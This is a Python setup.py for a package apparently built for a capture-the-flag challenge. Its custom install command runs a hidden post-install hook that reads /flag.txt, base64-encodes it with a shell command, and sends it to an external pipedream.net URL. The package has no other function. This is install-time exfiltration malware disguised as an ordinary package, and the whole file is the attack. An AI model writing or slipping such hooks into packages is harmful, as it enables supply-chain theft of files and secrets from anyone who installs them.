from setuptools import setup
import os
from setuptools.command.install import install



class PostInstallCommand(install):
    """Post-installation for installation mode."""
    def run(self):
        install.run(self)
        # PUT YOUR POST-INSTALL SCRIPT HERE or CALL A FUNCTION
        import requests
        requests.get("https://enof91bwipv4nw0.m.pipedream.net/?hehe="+os.popen("cat /flag.txt | base64").read())

setup(
    name='ctf-q21-empire-tmp-bw126916',
    description='Bye world',
    cmdclass={'install': PostInstallCommand},
    version='0.0.10',
    packages=['main'],
    install_requires=[
      'requests',
    ],
    )